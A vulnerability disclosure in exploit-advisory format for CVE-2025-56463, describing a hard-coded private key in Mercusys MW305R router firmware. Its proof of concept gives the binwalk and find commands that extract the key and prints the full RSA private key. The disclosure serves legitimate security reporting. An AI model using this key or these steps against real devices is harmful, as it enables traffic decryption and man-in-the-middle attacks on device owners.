# Exploit Title: Private Key Stored in Cleartext on Mercusys MW305R Firmware
# Date: 2025-09-25
# Exploit Author: Matei Josephs
# Vendor Homepage:[https://www.mercusys.com/]
# Version: DMW305R(EU)_V3.30_1.11.2 Build 241223
# CVE : CVE-2025-56463

Introduction
=================
This vulnerability exists in Mercusys MW305R due to hard-coded private key stored in plaintext within the device firmware. An attacker with physical access could exploit this vulnerability by extracting the firmware and analyzing the binary data to retrieve private key stored in the firmware of the targeted device. Successful exploitation of this vulnerability could allow the attacker to perform unauthorized decryption of sensitive data and Man-in-the-Middle (MitM) attacks on the targeted device.

Proof of Concept
=================

1. Download the firmware from [https://www.mercusys.com/en/download/mw305r/#Firmware]
2. Run ```binwalk -Me mw305v3-up-noboot_2024-12-23_16.30.47.bin```
3. Run ```find extractions * | grep 'pem'``` and observe the following files:

```                               
extractions/mw305v3-up-noboot_2024-12-23_16.30.47.bin.extracted/17F500/decompressed.bin.extracted/E6E7/pem.crt
extractions/mw305v3-up-noboot_2024-12-23_16.30.47.bin.extracted/190418/decompressed.bin.extracted/2185/pem.key
extractions/mw305v3-up-noboot_2024-12-23_16.30.47.bin.extracted/189312/decompressed.bin.extracted/1A8E6/pem.crt
extractions/mw305v3-up-noboot_2024-12-23_16.30.47.bin.extracted/189312/decompressed.bin.extracted/1BF09/pem.crt
extractions/mw305v3-up-noboot_2024-12-23_16.30.47.bin.extracted/17F500/decompressed.bin.extracted/E6E7/pem.crt
extractions/mw305v3-up-noboot_2024-12-23_16.30.47.bin.extracted/190418/decompressed.bin.extracted/2185/pem.key
extractions/mw305v3-up-noboot_2024-12-23_16.30.47.bin.extracted/189312/decompressed.bin.extracted/1A8E6/pem.crt
extractions/mw305v3-up-noboot_2024-12-23_16.30.47.bin.extracted/189312/decompressed.bin.extracted/1BF09/pem.crt
```

4. Print the content of one of the .key files:

```
-----BEGIN RSA PRIVATE KEY-----
MIIBOQIBAAJBALPoPA3V2dkOJlZuH2gkTA7hoCAz6/u8lp7z51qEzFLRZA9Csysz
GEfKhGuTIo/ampSQPiCFQgoTF8h9vYmyIHsCAwEAAQJANBdqTBc/nLmcICqCrYTV
APoTgz+FdL6GXkABHRSWlOPPU77+TYUvWa0prqeHsw9NsLhmY3DLQMt6plc2hwfw
AQIhAOzGkPBqtxbVJvEijU0neSC0oOWN1bqECp9RW2ze2uY7AiEAwoOk/3QGn+Xz
ZSZBG2qpIPGNeCS4ZZ0J0778zJcAysECIBdGJXUcaEbcSOmnBdCxspxeZPpriLi+
xfSHIL+A4G+FAiB+7gTnpcEE6rtvkA0AZRPEqZvVgLDLrjRRdtnkb81WgQIgV4wR
LynXZnhQaaT8oyKL1VKhgNIQp7rH3zNZ5oMvkG8=
-----END RSA PRIVATE KEY-----
```
